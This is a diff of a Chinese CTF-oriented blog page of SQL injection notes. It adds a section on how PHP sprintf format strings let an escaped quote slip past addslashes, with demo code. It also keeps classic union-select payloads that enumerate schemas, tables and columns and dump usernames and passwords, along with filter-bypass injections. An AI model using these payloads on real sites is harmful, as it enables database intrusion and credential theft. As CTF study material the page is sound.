@@ -393,14 +393,14 @@ desc xxx">
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    3.2k
+                    3.5k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    15 分
+                    16 分
                 </div>
                 
 				
@@ -528,7 +528,32 @@ FROM Websites;</code></pre><p>返回结果<br><img src="13.png" alt=""></p>
 | name3 | 男  |
 | name4 | 女  |
 +-------+-----+
-rows in set (0.00 sec)</code></pre><h3 id="五、题目经典payload"><a href="#五、题目经典payload" class="headerlink" title="五、题目经典payload"></a>五、题目经典payload</h3><pre><code>-1&#39; union select 1,2,group_concat(schema_name) from information_schema.schemata%23
+rows in set (0.00 sec)</code></pre><h3 id="五、sprintf格式化字符串带来的注入隐患"><a href="#五、sprintf格式化字符串带来的注入隐患" class="headerlink" title="五、sprintf格式化字符串带来的注入隐患"></a>五、sprintf格式化字符串带来的注入隐患</h3><p>语句</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+
+<span class="token variable">$input</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token string">"%1$' and 1=1#"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string">"AND b='%s'"</span><span class="token punctuation">,</span> <span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string">"SELECT * FROM t WHERE a='%s' $b"</span><span class="token punctuation">,</span> <span class="token string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token variable">$sql</span><span class="token punctuation">;</span></code></pre>
+<p>通过fuzz得知，在php的格式化字符串中，%后的一个字符(除了’%’)会被当作字符类型，而被吃掉，单引号’，斜杠\也不例外。</p>
+<p>如果能提前将%’ and 1=1#拼接入sql语句，若存在SQLi过滤，单引号会被转义成&#39;</p>
+<pre><code>select * from user where username = &#39;%\&#39; and 1=1#&#39;;</code></pre><p>然后这句sql语句如果继续进入格式化字符串，\会被%吃掉，’成功逃逸</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"select * from user where username = '%\' and 1=1#';"</span><span class="token punctuation">;</span>
+<span class="token variable">$args</span> <span class="token operator">=</span> <span class="token string">"admin"</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token function">sprintf</span><span class="token punctuation">(</span> <span class="token variable">$sql</span><span class="token punctuation">,</span> <span class="token variable">$args</span> <span class="token punctuation">)</span> <span class="token punctuation">;</span>
+<span class="token comment" spellcheck="true">//result: select * from user where username = '' and 1=1#'</span>
+<span class="token delimiter">?></span></code></pre>
+<p>还可以使用%1$吃掉后面的斜杠，而不引起报错</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"select * from user where username = '%1$\' and 1=1#' and password='%s';"</span><span class="token punctuation">;</span>
+<span class="token variable">$args</span> <span class="token operator">=</span> <span class="token string">"admin"</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token function">sprintf</span><span class="token punctuation">(</span> <span class="token variable">$sql</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span> <span class="token punctuation">;</span>
+<span class="token comment" spellcheck="true">//result: select * from user where username = '' and 1=1#' and password='admin';</span>
+<span class="token delimiter">?></span></code></pre>
+<p>具体题目为下方的迎圣诞，拿大奖”活动赛题sqli</p>
+<h3 id="六、题目经典payload"><a href="#六、题目经典payload" class="headerlink" title="六、题目经典payload"></a>六、题目经典payload</h3><pre><code>-1&#39; union select 1,2,group_concat(schema_name) from information_schema.schemata%23
 -1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema= &#39;security&#39;%23
 -1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name= &#39;users&#39;%23
 -1&#39; union select 1,group_concat(username),group_concat(password) from users%23</code></pre><h3 id="“百度杯”CTF比赛-九月场SQLi-过滤了逗号"><a href="#“百度杯”CTF比赛-九月场SQLi-过滤了逗号" class="headerlink" title="“百度杯”CTF比赛 九月场SQLi-过滤了逗号"></a>“百度杯”CTF比赛 九月场SQLi-过滤了逗号</h3><pre><code>id=1&#39; union select * from (select database()) a join (select version() ) b %23</code></pre><h3 id="过滤了空格，逗号，等号，for，and等的盲注，使用-mid函数骚操作"><a href="#过滤了空格，逗号，等号，for，and等的盲注，使用-mid函数骚操作" class="headerlink" title="过滤了空格，逗号，等号，for，and等的盲注，使用^mid函数骚操作"></a>过滤了空格，逗号，等号，for，and等的盲注，使用^mid函数骚操作</h3><p>空格用括号代替，等号用&lt;&gt;(一种不等号)代替<br>异或运算^代替and</p>
@@ -1055,7 +1080,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">148.5k</span>&nbsp;字
+                class="white-color">148.7k</span>&nbsp;字
             
             
             
